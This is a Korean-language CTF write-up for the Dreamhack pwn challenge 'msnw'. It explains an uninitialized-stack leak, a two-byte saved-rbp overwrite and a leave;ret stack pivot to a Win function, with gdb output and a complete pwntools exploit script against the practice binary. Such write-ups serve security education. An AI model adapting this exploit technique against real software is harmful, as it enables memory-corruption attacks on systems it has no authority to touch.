---
ctf_name: "DreamhackWargame"
challenge_name: "msnw"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "medium"      # easy / medium / hard / insane
author: "kjs24"
date: "2026-05-12"
points: 0
tags: [sfp overwrite]
---

# MSNW

## 문제 설명

> 문제에서 주어진 설명을 여기에 작성합니다.

- 문제 URL / 파일 등 접속 정보

이 문제는 MSNW(Meong Said, Nyang Wrote) 프로그램이 서비스로 등록되어 동작하고 있습니다.

프로그램의 취약점을 찾고 익스플로잇해 플래그를 획득하세요!

플래그 형식은 `DH{...}` 입니다.

## 풀이

### 분석

바이너리를 확인해보면 `Meong`, `Nyang`, `Call`, `Echo`, `Win` 함수가 존재한다.  
그중 플래그를 출력하는 함수는 `Win` 함수이며, 주소는 다음과 같다.

```text
0x000000000040135b  Win
```

`Meong` 함수와 `Nyang` 함수의 주소는 다음과 같다.

```text
0x0000000000401242  Meong
0x00000000004012b0  Nyang
```

두 함수의 주소 차이를 계산하면 다음과 같이 `110` 바이트 차이가 난다.

```text
pwndbg> print 0x00000000004012b0 - 0x0000000000401242
$1 = 110
```

문제에서 중요한 코드는 다음 부분이다.

```c
int Meong() {
    char buf[0x40];

    memset(buf, 0x00, 0x130);

    printf("meong 🐶: ");
    read(0, buf, 0x132);

    if (buf[0] == 'q')
        return QUIT;
    return NOT_QUIT;
}

int Nyang() {
    char buf[0x40];

    printf("nyang 🐱: ");
    printf("%s", buf);

    return NOT_QUIT;
}
```

소스 코드만 보면 `buf`의 크기는 `0x40`이다.  
하지만 실제로 gdb에서 확인해보면 `Meong` 함수의 `buf`는 `$rbp - 0x130` 위치에 잡혀 있었다.

```text
pwndbg> x/16gx $rbp - 0x130
0x7fffffffdac0: 0x6464646464646464      0x6464646464646464
0x7fffffffdad0: 0x6464646464646464      0x6464646464646464
0x7fffffffdae0: 0x6464646464646464      0x000000000a646464
0x7fffffffdaf0: 0x0000000000000000      0x0000000000000000
```

`Meong` 함수에서는 `memset(buf, 0x00, 0x130)`으로 `buf`부터 `0x130` 바이트를 초기화하고, 이후 `read(0, buf, 0x132)`로 `0x132` 바이트를 입력받는다.

즉, `buf`부터 SFP 바로 앞까지가 아니라 SFP의 하위 2바이트까지 덮을 수 있다.

또한 `Meong` 함수와 `Nyang` 함수는 같은 위치의 스택 프레임을 재사용한다.  
따라서 `Meong`에서 입력한 값이 스택에 남아 있고, 그 다음 호출되는 `Nyang`에서 초기화되지 않은 `buf`를 출력하면서 이전에 입력한 값이 다시 출력된다.

`Nyang` 함수는 다음과 같이 `buf`를 초기화하지 않고 바로 `%s`로 출력한다.

```c
int Nyang() {
    char buf[0x40];

    printf("nyang 🐱: ");
    printf("%s", buf);

    return NOT_QUIT;
}
```

이 구조 때문에 `Meong`에서 널 바이트 없이 `buf`를 꽉 채워두면, `Nyang`의 `printf("%s", buf)`가 `buf` 뒤쪽에 있는 SFP 일부까지 이어서 출력한다.  
이를 이용하면 SFP의 하위 바이트를 leak할 수 있다.

### 취약점

이 문제의 취약점은 크게 두 가지이다.

첫 번째는 `Meong` 함수의 SFP overwrite이다.

`Meong` 함수의 입력 부분은 다음과 같다.

```c
read(0, buf, 0x132);
```

실제 `buf`는 `$rbp - 0x130` 위치에 있고, 입력 크기는 `0x132`이다.  
따라서 `0x130` 바이트를 채운 뒤 추가로 2바이트를 더 입력하여 saved rbp, 즉 SFP의 하위 2바이트를 덮을 수 있다.

두 번째는 `Nyang` 함수의 uninitialized stack leak이다.

`Nyang` 함수에서는 지역 변수 `buf`를 초기화하지 않은 상태로 출력한다.

```c
printf("%s", buf);
```

`Meong`과 `Nyang`의 스택 프레임이 같은 위치에 잡히기 때문에, `Meong`에서 입력했던 값이 `Nyang`의 `buf` 위치에 그대로 남아 있다.  
따라서 `Meong`에서 `0x130` 바이트를 널 바이트 없이 채우면, `Nyang`에서 그 뒤에 이어지는 SFP 값까지 출력하게 된다.

SFP는 다음과 같은 스택 주소 형태를 가진다.

```text
0x00007fffffffddf0
```

리틀 엔디언으로 메모리에 저장되기 때문에 실제 메모리에는 하위 바이트부터 저장된다.  
즉, 앞쪽 바이트들은 널 바이트가 아니므로 `%s` 출력으로 일부 leak이 가능하다.

이 문제에서는 SFP 전체를 leak할 필요는 없고, 하위 2바이트만 알아내면 충분했다.  
왜냐하면 SFP 하위 2바이트만 조작해도 같은 스택 영역 안에서 `rbp`를 원하는 위치 근처로 옮길 수 있기 때문이다.

### 익스플로잇

익스플로잇의 전체 흐름은 다음과 같다.

1. 첫 번째 `Meong` 입력에서 `0x130` 바이트를 채운다.
2. 다음 `Nyang` 출력에서 SFP의 하위 2바이트를 leak한다.
3. 두 번째 `Meong` 입력에서 스택에 `Win` 함수 주소를 반복해서 채운다.
4. 마지막 2바이트로 SFP의 하위 2바이트를 덮는다.
5. `Call` 함수의 `leave; ret` 과정에서 stack pivot이 발생한다.
6. `ret`이 스택에 깔아둔 `Win` 주소를 가져가면서 `Win()`이 실행된다.

처음에는 SFP leak을 위해 `0x130` 바이트를 입력한다.

```python
payload = b'A' * (read_size - 0x2)

p.send(payload)
p.recvuntil(payload)

leak = p.recv()
leak = leak[0:2]

partial_leak = u16(leak)
```

`read_size`는 `0x132`이므로 `read_size - 0x2`는 `0x130`이다.  
즉, SFP를 덮지는 않고 SFP 바로 앞까지 채운다.

그 다음 `Nyang` 함수에서 `printf("%s", buf)`가 실행되면, 내가 입력한 `A`들이 먼저 출력되고 그 뒤에 SFP의 하위 바이트가 이어서 출력된다.  
여기서 앞의 2바이트만 잘라서 `partial_leak`으로 사용했다.

두 번째 입력에서는 스택에 `Win` 함수 주소를 반복해서 채운다.

```python
payload2 = p64(win_addr)

while len(payload2) != 0x130:
    payload2 += p64(win_addr)
```

정확히 한 지점에만 `Win` 주소를 두는 방식이 아니라, pivot될 가능성이 있는 영역을 `Win` 주소로 넓게 채웠다.  
이렇게 하면 약간의 오프셋 차이가 있어도 `ret`이 높은 확률로 `Win` 주소를 가져가게 된다.

마지막으로 SFP의 하위 2바이트를 조작한다.

```python
payload2 += p16(partial_leak - 512 - 0x40)
```

gdb로 확인했을 때 leak된 SFP와 `Meong`의 스택 프레임 사이에는 약 `512` 바이트의 고정 오프셋이 있었다.  
따라서 leak된 SFP 하위 2바이트에서 `512`를 빼면 `Meong`의 스택 프레임 근처로 이동할 수 있다.

여기서 추가로 `0x40`을 더 빼서, `ret`이 내가 `Win` 주소를 반복해서 채워둔 영역을 보도록 조정했다.

실제 흐름을 보면 `Meong`이 끝나자마자 바로 `Win`으로 점프하는 구조는 아니다.

```text
0x4012ae <Meong+108>    leave
0x4012af <Meong+109>    ret
↓
0x401320 <Call+40>      jmp    Call+52
↓
0x40132c <Call+52>      leave
0x40132d <Call+53>      ret
↓
0x40135b <Win>          endbr64
```

`Meong` 함수가 끝나면 일단 `Call` 함수 내부로 돌아간다.  
그 후 `Call` 함수가 종료되면서 `leave; ret`을 실행하는데, 이때 조작된 SFP 때문에 `rsp`가 내가 원하는 스택 위치로 이동한다.

즉, 여기서 stack pivot이 발생한다.

`leave` 명령은 내부적으로 다음과 비슷하게 동작한다.

```asm
mov rsp, rbp
pop rbp
```

따라서 SFP가 조작되어 있으면, 호출자 함수의 `leave` 시점에 `rsp`가 공격자가 의도한 위치로 이동할 수 있다.  
이후 `ret`은 현재 `rsp`가 가리키는 값을 return address로 사용한다.

결국 `Call` 함수의 `ret`이 내가 스택에 반복해서 넣어둔 `Win` 주소를 가져가면서 `Win()` 함수가 실행된다.

최종 exploit 코드는 다음과 같다.

```python
from pwn import *

context.binary = './msnw'

win_addr = 0x000000000040135b
read_size = 0x132

p = process('./msnw')
# p = remote('host8.dreamhack.games', 24297)

payload = b'A' * (read_size - 0x2)

p.send(payload)

p.recvuntil(payload)
leak = p.recv()
leak = leak[0:2]

partial_leak = u16(leak)
print(hex(partial_leak))

payload2 = p64(win_addr)

while len(payload2) != 0x130:
    payload2 = payload2 + p64(win_addr)

payload2 += p16(partial_leak - 512 - 0x40)

p.send(payload2)

p.interactive()
```

위 exploit을 실행하면 두 번째 입력 이후 `Call` 함수의 `leave; ret`에서 스택이 조작된 위치로 이동한다.  
그 결과 `ret`이 `Win` 함수 주소를 가져가고, `Win()`이 실행되면서 플래그 파일이 출력된다.

```c
void Win() {
    execl("/bin/cat", "/bin/cat", "./flag", NULL);
}
```

## 플래그

```text
DH{REDACTED}
```

## 배운 점

이 문제를 통해 SFP partial overwrite를 이용한 stack pivot 흐름을 정리할 수 있었다.

처음에는 return address를 직접 덮는 일반적인 BOF 문제처럼 접근할 수 있지만, 실제로는 SFP의 하위 2바이트만 덮을 수 있는 구조였다.  
따라서 return address를 직접 조작하는 대신, saved rbp를 조작하여 호출자 함수의 `leave; ret` 과정에서 스택을 원하는 위치로 옮겨야 했다.

또한 `Meong`과 `Nyang`의 스택 프레임이 같은 위치를 재사용한다는 점도 중요했다.  
`Meong`에서 입력한 데이터가 `Nyang`의 초기화되지 않은 지역 변수 출력으로 다시 노출되었고, 이를 통해 SFP의 일부를 leak할 수 있었다.

그리고 처음에는 브루트포스를 통해 하위 바이트 수정하면서 win 함수 실행시키려 했지만 스택 프레임에 win 주소를 가득채우는 방법을 고안하면서 좀 더 효율적인 익스를 하는 방법을 연습한 것 같아 뿌듯했다.
